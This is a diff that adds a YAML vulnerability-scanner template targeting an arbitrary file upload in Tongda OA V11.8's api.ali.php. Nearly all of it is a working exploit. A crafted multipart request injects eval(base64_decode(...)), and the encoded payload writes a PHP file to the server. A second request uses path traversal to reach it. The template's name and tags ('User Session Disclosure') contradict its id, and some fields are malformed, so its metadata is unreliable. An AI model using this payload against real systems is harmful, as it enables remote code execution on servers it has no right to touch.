@@ -1,0 +1,41 @@
+id: 通达 V11.8 API.ALI 任意文件上传
+
+info:
+  name: Tongda User Session Disclosure
+  author: ritikchaddha
+  severity: medium
+  description: api.ali.php 存在任意文件上传漏洞，通过漏可以上传恶意文件控制服务器
+  reference:
+    - https://www.hackjie.com/docs/3313.html
+  tags: tongda,disclosure
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/mobile/api/api.ali.php"
+      - "{{BaseURL}}/inc/package/work.php?id=../../../../../myoa/attach/approve_center/2307/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4"
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae & Accept-Encoding:gzip
+    body: 
+      - |
+        --502f67681799b07e4de6b503655f5cae
+        Content-Disposition:form-data; name="file"; filename="fb6790f4.json"
+        Content-Type:application/octet-stream
+   
+        {"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
+        --502f67681799b07e4de6b503655f5cae--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "+OK"
+
+      - type: status
+        status:
+          - 200
